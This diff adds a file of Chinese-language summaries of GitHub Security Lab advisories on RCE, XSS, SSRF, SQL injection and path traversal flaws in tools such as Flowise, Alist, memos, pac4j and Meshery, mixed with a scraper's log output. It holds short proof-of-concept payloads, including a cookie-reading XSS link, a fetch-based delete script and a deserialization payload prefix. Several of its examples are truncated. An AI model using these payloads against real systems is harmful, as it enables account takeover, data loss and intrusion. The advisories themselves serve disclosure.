@@ -1,0 +1,3589 @@
+# GHSL-2024-297_GHSL-2024-298: Plenti 的远程代码执行漏洞 - CVE-2024-49380, CVE-2024-49381
+
+## 什么是 Plenti？
+
+Plenti 是一个用于本地网站开发的工具，它可以通过 `serve` 命令创建一个本地服务器，让用户查看自己的网站。
+
+## 漏洞概述
+
+### 漏洞类型
+- **任意文件写入**：攻击者可以在服务器上写入任意文件。
+- **任意文件删除**：攻击者可以删除服务器上的任意文件。
+
+### 漏洞影响
+- **远程代码执行**：通过任意文件写入，攻击者可能执行恶意代码。
+- **信息丢失**：通过任意文件删除，攻击者可能导致数据丢失。
+
+### 漏洞位置
+
+这两个漏洞都存在于 `/postLocal` 端点中，当 Plenti 用户启动本地服务器时会触发这些漏洞。
+
+## 版本信息
+
+- 漏洞影响的 Plenti 版本：v0.7.1
+
+## 报告人
+
+这些漏洞由 GHSL 团队成员 @Kwstubbs（Kevin Stubbings）发现并报告。
+
+## 联系信息
+
+如需报告或询问此问题，请发送邮件至 securitylab@github.com，并在邮件中注明 GHSL-2024-297 或 GHSL-2024-298。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2024_297_GHSL_2024_298_Plenti_的远程代码执行漏洞_CV_0f2b8cea.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-297_GHSL-2024-298_plenti/
+# GHSL-2023-232_GHSL-2023-234: Flowise的安全漏洞概述
+
+## 漏洞类型
+1. **路径注入**（Path Injection）
+2. **跨站脚本攻击**（Cross-Site Scripting，XSS）
+3. **CORS配置错误**
+
+## 涉及的漏洞
+- CVE-2024-36420
+- CVE-2024-36421
+- CVE-2024-36422
+- CVE-2024-36423
+- CVE-2024-37145
+- CVE-2024-37146
+
+## 什么是Flowise？
+Flowise是一个管理聊天流的工具，存在多个安全漏洞，可能会导致服务器上的信息泄露。
+
+## 漏洞详情
+
+### 1. 路径注入漏洞
+- **影响版本**：v1.4.3
+- **具体位置**：`/api/v1/openai-assistants-file`
+- **问题**：`fileName`参数没有经过清理，可能允许攻击者读取任意文件。
+
+### 2. 跨站脚本（XSS）
+- **问题描述**：许多API接口存在反射型XSS漏洞。如果使用默认的未认证配置，攻击者可以构造特定的URL，注入JavaScript脚本，执行恶意操作（如盗取信息、弹出假消息、重定向用户等）。
+- **影响范围**：多个接口，包括：
+    - `/api/v1/chatflows/id`
+    - `/api/v1/public-chatflows/id`
+    - `/api/v1/chatflows-streaming/id`
+    - `/api/v1/credentials/id`
+
+### 3. CORS配置错误
+- **问题**：CORS的`Access-Control-Allow-Origin`头设置为所有，这允许任意来源访问Flowise。
+- **后果**：在默认配置下，攻击者可以从Flowise请求用户信息。
+
+## 发现和建议
+- **发现者**：GHSL团队成员 @Kwstubbs
+- **建议**：移除所有未经清理的数据直接传递到响应的情况，确保安全。
+
+## 联系方式
+如需进一步讨论这些问题，请联系GHSL团队：securitylab@github.com，并提及相关漏洞编号（GHSL-2023-232, GHSL-2023-234 或其他）。
+Folder '信息泄露' created.
+信息泄露
+内容已保存至 信息泄露/GHSL_2023_232_GHSL_2023_234_Flowise的安全漏洞概述_62648dd2.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise/
+# GHSL-2024-011: 在 Edge 和 Firefox 中通过智能扩展 Smartup 的通用跨站脚本（UXSS）执行任意 JavaScript - CVE-2024-49378
+
+## 背景信息
+
+- **漏洞类型**: 通用跨站脚本 (UXSS)
+- **影响浏览器**: Edge 和 Firefox
+- **受影响扩展**: Smartup (版本 7.2.622.1170)
+
+## 漏洞描述
+
+在 Smartup 扩展中，存在一个安全漏洞，允许其他扩展在用户的标签页中执行任意 JavaScript 代码。这是因为 Smartup 接收来自外部扩展的消息时，没有验证发送者的身份。
+
+## 漏洞机制
+
+1. **消息接收**: Smartup 允许外部扩展发送消息，而不检查这些消息的来源。
+2. **代码执行**: 收到的外部消息被传递到 `funOnMessage` 函数，该函数使用 `executeScript` 在当前标签页的上下文中执行传入的 JavaScript 代码。
+
+## 潜在影响
+
+恶意扩展可以利用此漏洞在用户的标签页中运行任意代码，可能导致用户所登录账户的安全性受到威胁。
+
+## 漏洞发现与报告
+
+- 此漏洞是通过 **CodeQL** 工具发现的。
+- 报告者: GHSL 团队成员 @Kwstubbs (Kevin Stubbings)
+
+## 联系信息
+
+如需了解更多信息或报告，您可以通过以下电子邮件联系 GHSL 团队: securitylab@github.com，并在通讯中提及 GHSL-2024-011。
+Folder 'XSS' already exists.
+XSS
+内容已保存至 XSS/GHSL_2024_011_在_Edge_和_Firefox_中通过智能扩展_Smartup_的通_25b108a3.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-011_smartup/
+# GHSL-2023-136: 在Samson中发现的远程代码执行(RCE)漏洞
+
+## 漏洞简介
+
+在Samson的Kubernetes::RoleVerificationsController中，程序错误地处理了用户输入的数据，这导致了远程代码执行(RCE)。
+
+## 技术细节
+
+- **版本**：Samson v3382
+- **问题来源**：用户提供的"role"参数进入了Kubernetes::RoleVerificationsController。
+- **处理流程**：
+  1. "role"参数流入RoleConfigFile初始化器。
+  2. 随后进入Kubernetes::Util.parse_file方法，里面的不安全反序列化发生了。
+  
+- **具体问题**：使用`YAML.load_stream`方法来处理不受信任的数据是不安全的，因为它允许实例化任意类，这可能导致远程代码执行(RCE)。
+
+## 影响
+
+这个漏洞可能使攻击者能够在服务器上执行任意代码，造成严重的安全风险。
+
+## 报告和联系
+
+该问题是由GHSL团队成员@pwntester（Alvaro Muñoz）发现并报告的。如需进一步沟通，请通过 securitylab@github.com 联系GHSL团队，并在邮件中提及GHSL-2023-136。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2023_136_在Samson中发现的远程代码执行_RCE_漏洞_2b060a4f.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-136_Samson/
+# 简介：Alist中的反射型跨站脚本攻击（XSS）漏洞 - CVE-2024-47067
+
+Alist的某些版本中存在一个反射型跨站脚本（XSS）漏洞，可能允许未认证用户通过特制链接盗取其他用户的JWT令牌。这种情况下，攻击者可能会获取、删除或读取与该用户相关的文件。
+
+## 技术背景
+
+- **Alist版本**：3.28.0
+- **漏洞类型**：反射型跨站脚本（XSS）
+- **受影响的端点**：`/i/:link_name`
+  - 该端点接受用户提供的值，并将其反射回响应中，导致XSS漏洞。
+  - 返回的响应为`application/xml`，并且通过XHTML允许使用HTML标签。
+
+## 漏洞影响
+
+1. **文件操作**：攻击者可能会执行任意文件删除、读取或下载操作。
+2. **JWT令牌泄露**：点击特制链接后，当前用户的JWT令牌会在弹窗中显示。
+
+**点击此链接查看JWT令牌：**
+```
+http://alist.domain/i/JTY4...
+```
+> 注意：由于此问题的未认证特性，我们在此报告但不将其标记为漏洞。
+
+## 安全风险
+
+如果启用访客用户功能，攻击者可以在未认证的情况下代表访客用户发送请求。这是由于`Access-Control-Allow`头设置为所有来源（`*`）。
+
+例如：
+- 如果内部网络的Alist服务器被外部访问，通过访问特制网站，攻击者可以让已连接到该网络的其他访客用户执行任意请求。
+- 假设访客用户可以删除特定目录的文件，攻击者可以引导其删除该目录。
+
+### 漏洞测试示例
+
+1. 创建一个`index.html`文件，内容如下（示例代码）：
+   ```html
+   <script>
+       fetch("/api/fs/remove", { method: 'DELETE' });
+   </script>
+   ```
+2. 当受害者访问此文件时，将发送请求删除`/tmp/test/test.txt`中的文件。
+
+## 联系方式
+
+此漏洞由GHSL团队的@Kwstubbs（Kevin Stubbings）发现。感谢Alvaro Munoz对利用此漏洞的帮助。如需联系GHSL团队，请发送邮件至securitylab@github.com，并在通讯中包含GHSL-2023-220的引用。
+Folder 'XSS' already exists.
+XSS
+内容已保存至 XSS/简介_Alist中的反射型跨站脚本攻击_XSS_漏洞_CVE_2024_47067_0eef9ce6.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-220_Alist/
+# GHSL-2024-127_GHSL-2024-129: OpenC3 COSMOS 远程代码执行漏洞报告
+
+## 概述
+
+在 OpenC3 COSMOS （一个用于控制卫星和测试设备的 web 应用程序）中发现了几个漏洞，这些漏洞可能导致远程代码执行（RCE）和信息泄露。主要缺陷来自跨站脚本攻击（XSS）。
+
+## 主要漏洞
+
+### 1. 路径遍历漏洞
+
+- **版本**: OpenC3 COSMOS v5.16.2
+- **描述**: 经过身份验证的用户可以利用 `ScreensController#show` 方法中的路径遍历漏洞下载服务器上的任意 `.txt` 文件。
+- **原理**:
+  - 用户提供的参数 `target` 和 `screen` 被用于构造文件路径，这个路径最终被送入 `File.open` 进行打开。
+  - 必须通过特定的 URL 参数构造文件路径，例如：要访问 `/openc3/python/requirements.txt`，需提供合适的参数。
+  
+```bash
+curl -X GET "http://<cosmos-host>/path?target=<your_target>&screen=<your_screen>"
+```
+
+### 2. 反射型跨站脚本（XSS）漏洞
+
+- **描述**: 登录功能中存在 XSS 漏洞，攻击者可以通过特制的重定向参数注入恶意 JavaScript 代码。当用户登录后，这段代码可以执行。
+- **原理**:
+  - 攻击者诱导用户访问特定链接，当用户登录时，输入的密码会被恶意 JavaScript 代码捕获并发送给攻击者。
+  
+### 3. 不加密的密码存储
+
+- **描述**: OpenC3 COSMOS 在浏览器的 LocalStorage 中以明文形式存储用户密码，这使得密码容易被窃取。
+- **原理**:
+  - 攻击者可利用 XSS 漏洞获取 LocalStorage 中的密码，并将其发送到控制的远程服务器。
+
+## 结论
+
+以上漏洞均可能导致信息泄露及远程代码执行。建议尽快更新至安全版本并加强安全措施。
+
+## 联系
+
+如需了解更多信息或报告类似问题，请联系 GHSL 团队：[securitylab@github.com](mailto:securitylab@github.com)，请在邮件中提及 GHSL-2024-127, GHSL-2024-128 或 GHSL-2024-129。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2024_127_GHSL_2024_129_OpenC3_COSMOS_远程代码执行漏_4e5d8331.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-127_GHSL-2024-129_OpenC3_COSMOS/
+# GHSL-2023-238_GHSL-2023-244: Ngrinder中的安全漏洞概述
+
+Ngrinder是由Naver开发的一款Web应用程序，发现了多个安全漏洞，包括 **未认证的远程代码执行（RCE）** 和 **不当的访问控制**。以下是这些漏洞的重要技术知识点。
+
+## 漏洞总结
+
+### 1. 远程代码执行（RCE）漏洞
+- 两个API端点允许未认证的攻击者执行任意命令。
+- **/monitor/api/state?ip={ip}**：允许攻击者指定IP地址，让Ngrinder连接其控制的JMX/RMI服务器。这可以让攻击者运行任意命令。
+  - 攻击者通过`ip`参数传递一个恶意的RMI地址，执行`touch /tmp/pwnedGroovy.txt`命令。
+  
+- **/script/api/github/validate**：通过未安全处理的YAML反序列化，允许攻击者执行任意代码。
+  - 传递的YAML数据被不安全地传递到一个反序列化点，使攻击者可以执行命令。
+
+### 2. 远程拒绝服务（DoS）
+- **/check/healthcheck_slow**：此端点接受来自用户的任意延迟请求，攻击者可以发送大量高延迟的请求来占用服务器线程，导致服务不可用。
+
+### 3. 不当访问控制导致的风险
+- 攻击者可以未认证地创建或更新Webhook配置，可能导致信息泄露或有限的服务器端请求伪造（SSRF）。
+- 攻击者能够查看Webhook请求的执行结果，包括HTTP头和消息体，造成信息泄露。
+
+### 4. 不需要认证的报告查看
+- 多个性能报告的端点不需要认证，任何人都可以查看报告，导致信息泄露。
+
+## 漏洞的影响
+- 上述漏洞可能导致：
+  - 未认证的远程代码执行（RCE）
+  - 远程服务中断（DoS）
+  - 信息泄露
+  - 非授权的配置修改
+
+## 安全建议
+- 建议尽快更新Ngrinder到最新版本以修复这些漏洞。
+- 实施适当的访问控制和输入验证机制。
+
+## 联系方式
+如需进一步帮助，请联系GHSL团队：securitylab@github.com，提供报告参考信息。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2023_238_GHSL_2023_244_Ngrinder中的安全漏洞概述_c9df7442.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-238_GHSL-2023-244_ngrinder/
+# GHSL-2024-167: Monkeytype代码注入漏洞 - CVE-2024-41127
+
+## 概述
+Monkeytype存在一个安全漏洞，攻击者可以通过代码注入利用该漏洞，从而获得对拉取请求的写入权限。
+
+## 漏洞详细信息
+- **漏洞类型**: 代码注入导致的“中毒管道执行”。
+- **受影响的文件**: `ci-failure-comment.yml` GitHub工作流程。
+- **触发条件**: 当MonkeyCI工作流程完成时，该工作流程会被触发。
+
+## 漏洞机制
+1. **工作流程**: `ci-failure-comment.yml` 在CI工作流程完成时执行。
+2. **获取数据**: 它会下载由触发的工作流程上传的一个"artifact"。
+3. **数据处理**: 将该Artifact中的`./pr_num/pr_num.txt`内容分配给`steps.pr_num_reader.outputs.content`变量。
+4. **缺陷**: 该变量没有被验证是否为数字，之后它被插入到一个JavaScript脚本中。
+5. **攻击风险**: 攻击者可以改变被执行的代码，从而获得拉取请求的写入权限。
+
+## 发现与报告
+该漏洞是由GHSL团队成员@pwntester（Alvaro Muñoz）发现和报告的。
+
+如需联系GHSL团队，请发送电子邮件至securitylab@github.com，并在任何关于此问题的通信中提及GHSL-2024-167。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2024_167_Monkeytype代码注入漏洞_CVE_2024_41127_5859fa6c.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-167_monkeytype/
+# GHSL-2023-250：DocsGPT中的未经验证的有限文件写入漏洞 - CVE-2024-31451
+
+## 概述
+DocsGPT（版本0.5.0）存在一个未经验证的文件写入漏洞，攻击者可以利用此漏洞进行有限的文件写入。
+
+## 漏洞详情
+- **漏洞位置**：`check_docs` 接口。
+- **漏洞原因**：该接口将用户提交的POST数据与一个URL连接起来，这使得攻击者可以篡改下载文件的源库。
+- **影响**：恶意用户可能能够在服务器上写入有限的文件。
+
+## 漏洞发现
+- 该漏洞是通过 **CodeQL** 工具发现的。
+- 发现并报告该问题的人员是GHSL团队成员**Sylwia Budzynska**。
+
+## 联系方式
+如果对该漏洞有疑问或需要更多信息，请联系GHSL团队：  
+邮箱：securitylab@github.com  
+邮件中请提及“GHSL-2023-250”以便于处理。
+
+## 重要术语
+- **未经验证**：即没有经过身份验证的用户也能利用该漏洞。
+- **有限文件写入**：指攻击者可以写入特定文件，但可能受到限制。
+Folder '任意文件读写漏洞' already exists.
+任意文件读写漏洞
+内容已保存至 任意文件读写漏洞/GHSL_2023_250_DocsGPT中的未经验证的有限文件写入漏洞_CVE_2024_31_8d7beb27.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-250_DocsGPT/
+# GHSL-2024-090: yt-dlp中的路径遍历漏洞导致远程代码执行 - CVE-2024-38519
+
+## 漏洞概述
+
+- **软件**: yt-dlp
+- **版本**: v2024.04.09
+- **漏洞类型**: 路径遍历 (Path Traversal)
+- **影响平台**: Windows
+- **结果**: 允许任意二进制文件覆盖，可能导致远程代码执行 (RCE)
+
+## 技术背景
+
+### yt-dlp功能
+
+- yt-dlp 是一个下载视频和字幕的工具。
+- 用户可以通过命令行选项（如 `--write-subs`、`--write-auto-subs`、`--all-subs` 或 `--write-srt`）来指定下载字幕。
+- 提供的提取器（extractor）负责处理不同视频网站的下载。
+
+### 字幕扩展的处理
+
+- 一些提取器会提供字幕的下载URL和扩展名。
+- yt-dlp 将使用这些扩展名来生成输出文件名。
+- 默认情况下生成的字幕文件名格式为: `%(title)s [%(id)s].%(sub_lang).%(sub_format)s`。
+- `sub_format`是从提取的URL中获得的字幕扩展名。
+
+### 漏洞详细分析
+
+- yt-dlp **没有验证**字幕扩展名的有效性。
+- 在Windows上，如果攻击者使用特制的字幕扩展名，可能会导致路径遍历漏洞。
+- 攻击者可以通过精心构造的链接来覆盖系统中的任意文件。
+
+### 影响
+
+- 这种路径遍历漏洞可以导致未授权的文件系统修改。
+- 如果被覆盖的文件是可执行文件，可能会导致远程代码执行（RCE）。
+
+## 如何利用
+
+- 除了依赖于视频托管网站的漏洞，攻击者还可以自行构造特定的下载链接来利用该漏洞。
+- 例如，攻击者可引导特定的yt-dlp用户下载受影响的视频及其字幕。
+
+## 联系信息
+
+- 漏洞由GHSL团队成员@JarLob（Jaroslav Lobačevski）发现并报告。
+- 如需更多信息，请联系GHSL团队：[securitylab@github.com](mailto:securitylab@github.com)，并在任何通信中提及GHSL-2024-090。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2024_090_yt_dlp中的路径遍历漏洞导致远程代码执行_CVE_2024_3_d8198af4.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-090_yt-dlp/
+# GHSL-2024-045_GHSL-2024-047: 命令注入和有限文件写入漏洞 (CVE-2024-39685, CVE-2024-39686, CVE-2024-39688)
+
+## 概述
+fishaudio/Bert-VITS2 的 v2.3 版本存在两个安全漏洞：
+1. **命令注入**：允许攻击者执行任意命令。
+2. **有限文件写入**：允许攻击者在特定目录写入文件。
+
+## 漏洞详情
+
+### 1. 命令注入
+- **受影响代码**：
+  - 在 `resample` 函数中（第 46-52 行）：
+    ```python
+    subprocess.run(cmd, shell=True)
+    ```
+  - 在 `bert_gen` 函数中（第 82 行）：
+    ```python
+    subprocess.run(cmd, shell=True)
+    ```
+
+- **问题**：用户提供的 `data_dir` 变量未经处理直接用于执行命令，可能导致服务器上任意命令的执行。
+
+### 2. 有限文件写入
+- **受影响代码**：
+  - 在 `generate_config` 函数中（第 34 行）：
+    ```python
+    open(f"{data_dir}/config/config.json", "w")
+    ```
+
+- **问题**：用户输入的 `data_dir` 被用于打开新文件，允许写入任意目录的 `/config/config.json` 文件。如果指定的目录不存在，应用程序会返回错误，这使得攻击者能够获取服务器上存在目录的信息。
+
+## 报告及联系方式
+这些漏洞是由 GHSL 团队成员 @sylwia-budzynska 报告的。  
+如需联系 GHSL 团队，请发送邮件至 securitylab@github.com，并在沟通中提及 GHSL-2024-045、GHSL-2024-046 或 GHSL-2024-047。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2024_045_GHSL_2024_047_命令注入和有限文件写入漏洞_CVE_20_d40e878f.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-045_GHSL-2024-047_fishaudio_Bert-VITS2/
+# GHSL-2023-154_GHSL-2023-156: memos API中的服务器端请求伪造 (SSRF) 和跨站脚本 (XSS) 漏洞 - CVE-2024-29028, CVE-2024-29029, CVE-2024-29030
+
+## 概述
+
+在 **memos** API 服务中发现了多个 **SSRF** 漏洞，这些漏洞允许用户（无论是未认证还是已认证）访问和读取内部网络信息。此外，一个SSRF漏洞导致了一个反射型 **XSS** 漏洞，攻击者可能会因此完全控制管理员账户。
+
+## 技术基础知识
+
+### 服务器端请求伪造（SSRF）
+
+- SSRF 漏洞让攻击者能够通过特制请求访问服务器的内部网络。
+- 这些漏洞可能导致信息泄露。
+
+### 跨站脚本（XSS）
+
+- XSS 漏洞允许攻击者注入恶意脚本，可能导致账户权限提升。
+- 例如，攻击者可以使管理员账户的密码被更改。
+
+## 详细说明
+
+1. **未认证的 SSRF 漏洞**：
+   - 路径：`/o/get/httpmeta`
+     - 影响：未认证用户可以列举内部网络并接收部分HTML信息（以JSON格式）。
+   - 路径：`/o/get/image`
+     - 影响：未认证用户可以列举内部网络并获取图像，同时引发反射型 XSS 漏洞。
+
+2. **已认证的 SSRF 漏洞**：
+   - 路径：`/api/resource`
+     - 影响：已认证用户可以列举内部网络。
+
+## 漏洞验证示例
+
+### SSRF 示例
+
+- **访问未认证的端点**：
+  ```bash
+  curl http://0.0.0.0:5230/o/get/<endpoint>?url=<full url>
+  ```
+
+- **访问已认证的端点**：
+  登录到memos -> 资源 -> 创建资源 -> 选择外部链接，输入完整URL以执行列举。确保请求中 `downloadToLocal` 的值为 `true`。
+
+### XSS 示例
+
+攻击者可以托管以下 **SVG** 文件。如果用户（管理员或普通用户）点击以下链接：
+```plaintext
+http://0.0.0.0:5230/o/get/image?url=<attacker controlled svg file url>
+```
+用户账户的密码将被更改为"password"，攻击者可以进行登录。
+
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+```
+
+## 发现与报告
+
+这些漏洞由 **GHSL** 团队成员 @Kwstubbs (Kevin Stubbings) 发现并使用 CodeQL 工具进行帮助分析。
+
+如果需要与 **GHSL** 团队联系，请发送邮件至 `securitylab@github.com`，在任何关于这些问题的沟通中，请包括 GHSL-2023-154、GHSL-2023-155 或 GHSL-2023-156 的引用。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2023_154_GHSL_2023_156_memos_API中的服务器端请求伪造_baa9821d.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-154_GHSL-2023-156_memos/
+# GHSL-2024-019_GHSL-2024-024: Kohya_ss安全漏洞概述
+
+**Kohya_ss版本**: v22.6.1  
+**漏洞类别**: 多个命令注入和路径注入  
+**CVE编号**: CVE-2024-32022, CVE-2024-32026, CVE-2024-32025, CVE-2024-32027, CVE-2024-32024, CVE-2024-32023
+
+## 漏洞介绍
+
+Kohya_ss v22.6.1 存在多个安全漏洞，可能导致服务器上的命令被任意执行。这些漏洞主要体现在以下功能中：
+
+1. **gradio_basic_caption_gui_tab**: 在 `basic_caption_gui.py` 中，用户输入的 `images_dir` 被直接用于生成命令，可能导致命令注入。
+2. **gradio_git_caption_gui_tab**: 在 `git_caption_gui.py` 中，用户输入的 `train_data_dir` 同样被用于命令生成，存在命令注入风险。
+3. **gradio_group_images_gui_tab**: 在 `group_images_gui.py` 中，用户输入的 `group_size` 被用作命令参数，可能导致命令执行漏洞。
+4. **finetune_tab**: 在 `finetune_gui.py` 中，输入的 `caption_metadata_filename` 直接影响命令生成，存在命令注入可能。
+
+## 系统 affected
+- **POSIX系统**（如Linux）: 漏洞危险性较大。
+- **Windows系统**: 尽管也执行了命令，但缺少使用shell的权限，从而降低了漏洞利用的风险。
+
+## 文件写入漏洞
+
+### 1. **add_pre_postfix 函数**
+- 此函数利用用户输入创建文件路径，允许攻击者控制文件内容和扩展名，限制于某些类型的文件（如 `.jpg`, `.jpeg`, `.png`, `.webp`），但文件名不可控。
+
+### 2. **find_and_replace 函数**
+- 此函数允许用户输入多个参数（如 `folder_path`, `caption_file_ext`, `search_text`, `replace_text`），从而可以修改系统上任何已知内容的文件，例如配置文件。
+
+### 漏洞后果
+- 这些漏洞可能导致有限的文件写入能力，攻击者能够修改系统文件内容。
+
+## 发现与报告
+这些安全问题由GHSL团队成员**Sylwia Budzynska**发现，并通过**CodeQL工具**进行分析。
+
+## 联系信息
+如有相关问题，请联系GHSL团队：`securitylab@github.com`，并在邮件中提及相关的GHSL编号（如GHSL-2024-019等）。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2024_019_GHSL_2024_024_Kohya_ss安全漏洞概述_479496b2.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-019_GHSL-2024-024_kohya_ss/
+# GHSL-2023-253: OpenRASP中的反射型跨站脚本漏洞 (XSS) - CVE-2024-29183
+
+在OpenRASP的云接口中发现了一个反射型跨站脚本（XSS）漏洞，允许未认证的攻击者获取用户的会话信息。
+
+## 漏洞概述
+
+- **受影响版本**: OpenRASP v1.3.7
+- **漏洞类型**: 反射型XSS
+- **影响页面**: /login
+
+## 漏洞描述
+
+在登录页面，因为`redirect`参数的反射，攻击者能够执行任意的JavaScript代码。这样，当用户用他们的账户登录后，攻击者可以在用户的权限下运行脚本。
+
+### 漏洞影响
+
+- **特权提升**: 攻击者可能会利用此漏洞获得更高的权限。
+- **信息泄露**: 攻击者能够访问用户的敏感信息。
+
+### 演示链接
+
+以下链接展示如何执行JavaScript以显示已登录用户的Cookie值，表明攻击者可以获取用户的会话信息：
+```
+http://openrasp_cloud.domain/#/login?redirect=javascript:alert(document.cookie)
+```
+
+攻击者可以通过对URL进行编码来隐藏攻击过程，增加攻击的隐蔽性。
+
+## 报告者信息
+
+此漏洞由GHSL团队成员 @Kwstubbs (Kevin Stubbings) 发现并报告。 
+
+如需更多信息，请联系GHSL团队，邮箱地址为 securitylab@github.com，并在沟通中提及GHSL-2023-253。
+Folder 'XSS' already exists.
+XSS
+内容已保存至 XSS/GHSL_2023_253_OpenRASP中的反射型跨站脚本漏洞_XSS_CVE_202_c03d1237.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-253_openrasp/
+# GHSL-2023-277: Owncast中的任意文件删除漏洞 (CVE-2024-31450)
+
+## 概述
+Owncast版本0.1.2存在一个漏洞，允许拥有管理员权限的远程攻击者通过发送恶意POST请求到 `/api/admin/emoji/delete` 来删除任意文件。
+
+## 技术细节
+- **应用程序**: Owncast
+- **版本**: 0.1.2
+- **API端点**: `/api/admin/emoji/delete`
+  
+该API允许管理员删除保存于磁盘上的自定义emoji。请求中包含的参数会被直接用于构建文件路径，删除指定的emoji。
+
+### 漏洞关键点
+- 攻击者可以利用"路径遍历"（例如使用`../`）的技术。
+- 这使得攻击者可以删除系统中emoji目录以外的任意文件，造成严重的安全隐患。
+
+### 示例
+为了利用该漏洞，攻击者可以发送如下POST请求（需要管理员用户的凭证）。
+
+## 发现与报告
+该漏洞由GitHub的CodeQL团队成员 @atorralba (Tony Torralba) 发现，并通过CodeQL的路径注入查询工具进行确认。
+
+## 联系方式
+如需进一步信息，可以联系GHSL团队，邮箱为：securitylab@github.com，并在通信中提及GHSL-2023-277。
+Folder '任意文件读写漏洞' already exists.
+任意文件读写漏洞
+内容已保存至 任意文件读写漏洞/GHSL_2023_277_Owncast中的任意文件删除漏洞_CVE_2024_31450_467070e9.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-277_Owncast/
+# GHSL-2022-085: Java 反序列化漏洞导致 RCE 在 pac4j-core 中 - CVE-2023-25581
+
+## 漏洞概述
+
+在 pac4j-core 版本 4 之前的版本中，存在一个 Java 反序列化漏洞。这个漏洞影响到存储外部控制值的 `UserProfile` 类的属性。攻击者可以通过提供一个带有特殊前缀 `{#sb64}` 和 Base64 编码的序列化 Java 对象的属性来利用这个漏洞。
+
+## 技术细节
+
+- **受影响版本**: pac4j-core v3.8.3
+- **关键方法**: `org.pac4j.core.profile.InternalAttributeHandler#restore`
+
+### 漏洞成因
+
+- **属性处理**: `InternalAttributeHandler#prepare` 方法支持多种属性类型，例如 String, Boolean, Data 和 URI。当存储任意类型的对象时，会使用 Java 序列化和 `ObjectInputStream`，并添加 `{#sb64}` 前缀。
+- **恢复属性**: 当恢复属性时，`InternalAttributeHandler#restore` 方法会检查前缀并构建相应类型。但是对于字符串属性，`prepare` 方法没有检查字符串值是否已经以 `{#sb64}` 开头。这使得攻击者可以通过存储外部控制的字符串（如用户名或邮箱）来引发任意 Java 类的反序列化。
+
+### 示例攻击
+
+假设将用户的用户名存储为属性，可以使用如下值触发反序列化漏洞：
+```
+{#sb64}rO0ABXN...serizalized_object_in_base64...
+```
+
+## 后果
+
+此漏洞可能导致远程代码执行（RCE）。虽然已有一个 `RestrictedObjectInputStream` 限制可以反序列化的类，但仍然允许大量 Java 包，这可能被多种攻击手法利用。
+
+## 报告与联系
+
+此问题由 GHSL 团队成员 @artsploit（Michael Stepankin）发现并报告。如需进一步信息，请联系 GHSL 团队: securitylab@github.com，并在通信中提及 GHSL-2022-085。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2022_085_Java_反序列化漏洞导致_RCE_在_pac4j_core_中_73fe7e21.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2022-085_pac4j/
+# GHSL-2024-013_GHSL-2024-014: Meshery中的SQL注入漏洞 - CVE-2024-35181, CVE-2024-35182
+
+## 概述
+
+Meshery在版本v0.7.22及之前存在SQL注入漏洞，这使得远程攻击者可以通过HTTP接口的Order和Sort参数获取敏感信息、修改数据库内容或创建任意文件。
+
+## 漏洞详细信息
+
+### 影响的功能
+
+- **GetMeshSyncResourcesKinds**: API URL为 `/api/system/meshsync/resources/kinds`
+  - **问题**: Order查询参数直接构建SQL查询。攻击者可以利用这个漏洞执行堆叠查询，通过执行 `ATTACH DATABASE` 命令来写入任意文件。
+
+- **GetAllEvents**: API URL为 `/api/v2/events`
+  - **问题**: Sort查询参数同样直接用于构建SQL查询，攻击者可以利用这个漏洞同样执行堆叠查询和创建任意数据库条目。
+
+### 潜在影响
+
+- 攻击者可以访问和修改数据库中的数据，包括：
+  - 性能配置（可能包含会话cookie）
+  - Meshery应用数据
+  - Kubernetes配置
+
+### 漏洞利用方式
+
+1. **写入文件**: 使用SQL注入的堆叠查询加载任意内容。
+2. **创建数据库条目**: 通过相应请求创建数据库中的任意条目。
+3. **提取信息**: 需要使用盲SQL注入技巧，比如使用 `sqlmap` 工具自动化提取性能配置中的请求cookie。
+
+### 发现和报告
+
+这些漏洞是由GitHub团队成员@atorralba（Tony Torralba）发现并报告的，使用了CodeQL的SQL注入查询工具。
+
+## 联系方式
+
+如需更多信息或报告相关问题，请联系GHSL团队：securitylab@github.com，并在沟通中引用GHSL-2024-013或GHSL-2024-014。
+Folder 'SQL注入' created.
+SQL注入
+内容已保存至 SQL注入/GHSL_2024_013_GHSL_2024_014_Meshery中的SQL注入漏洞_CV_30985bb9.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-013_GHSL-2024-014_Meshery/
+# GHSL-2023-249: Meshery中的SQL注入漏洞 - CVE-2024-29031
+
+Meshery在版本0.6.181及之前存在一个SQL注入漏洞，攻击者可以通过`GetMeshSyncResources`的`order`参数获取敏感信息。
+
+## Meshery概述
+
+Meshery项目在API地址`/api/system/meshsync/resources`处提供了`GetMeshSyncResources`函数。在`meshync_handler.go`文件的第135行，`order`查询参数直接用于构造SQL查询。这可能导致安全问题，如：
+
